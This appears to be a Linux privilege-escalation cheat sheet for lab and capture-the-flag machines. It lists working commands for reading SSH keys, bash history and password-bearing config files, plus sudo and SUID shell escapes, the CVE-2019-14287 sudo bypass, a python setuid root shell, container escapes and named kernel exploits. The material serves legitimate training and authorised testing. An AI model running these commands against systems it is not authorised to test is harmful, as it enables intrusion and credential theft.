# Linux privilege escalation

Enumerate manually first — the checks below take 60 seconds and find the
intended path most of the time. Run linpeas as a backstop, not as step one; its
output is long and easy to drown in.

## Manual sweep

```bash
id; sudo -l
uname -a; cat /etc/os-release
cat /etc/passwd | grep -v nologin
ls -la /home/*; ls -la ~
find / -perm -4000 -type f 2>/dev/null            # SUID
find / -perm -2000 -type f 2>/dev/null            # SGID
getcap -r / 2>/dev/null                            # capabilities
cat /etc/crontab; ls -la /etc/cron.*
ps aux --forest | head -60
netstat -tulpn 2>/dev/null || ss -tulpn            # internal-only services
find / -writable -type d 2>/dev/null | grep -v proc | head
```

Credential hunting:
```bash
grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /opt /home /etc 2>/dev/null | grep -v Binary | head -50
ls -la /var/backups /tmp /opt
cat ~/.bash_history; cat ~/.ssh/id_*
find / -name '*.kdbx' -o -name '.env' -o -name 'config.php' -o -name 'wp-config.php' 2>/dev/null
```

## sudo -l

The single highest-yield check. Any allowed binary → look it up on GTFOBins:
```
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/profile      # then !/bin/sh
```
`env_keep+=LD_PRELOAD` present → compile a shared object with a `_init` that
spawns a shell, then `sudo LD_PRELOAD=/tmp/x.so <anything>`.
Wildcards in a sudo rule (`sudo /bin/tar -czf /tmp/x /var/www/*`) → checkpoint
injection or filename-as-argument tricks.
`(ALL, !root)` in older sudo → CVE-2019-14287, `sudo -u#-1 /bin/bash`.

## SUID / capabilities

Compare the SUID list against a stock system — anything unusual is the path.
GTFOBins again for the standard binaries. `cap_setuid+ep` on python/perl:
```bash
./python -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

## Cron and writable scripts

```bash
./pspy64        # watch for jobs that /etc/crontab does not list
```
A root cron running a script you can write, or running a relative path with a
writable PATH component, is a direct win. Also check for `tar`/`rsync`
wildcards in cron commands.

## Services and internal ports

Something listening on 127.0.0.1 that is not exposed externally is usually
where the escalation lives — an unauthenticated admin panel, a Redis, a
database. Forward it out (see `references/pivoting.md`) and attack it.

## Password reuse

Every password you have found, tried against every user in `/etc/passwd`, plus
`su`. This resolves a large fraction of lab boxes and costs nothing.

## Containers

If `/.dockerenv` exists or the cgroup shows docker, check for:
- the docker socket mounted (`/var/run/docker.sock`) → run a privileged
  container mounting the host root
- `--privileged` (check `capsh --print` for `cap_sys_admin`) → cgroup release_agent escape
- host filesystem mounted somewhere under `/mnt`

## Kernel exploits — last resort

Only when enumeration is genuinely exhausted. They crash lab boxes and
demonstrate nothing interesting. If you must: match the exact kernel version,
prefer a well-reviewed PoC (DirtyPipe CVE-2022-0847, PwnKit CVE-2021-4034,
Dirty COW on ancient boxes), and note that PwnKit is a `pkexec` misconfiguration
rather than a kernel bug — check for it early, it is common on older lab images.

## Confirm and record

```bash
id                  # uid=0(root)
cat /root/root.txt
```
Write the escalation vector and its evidence file into FINDINGS.md before
moving on to the report.
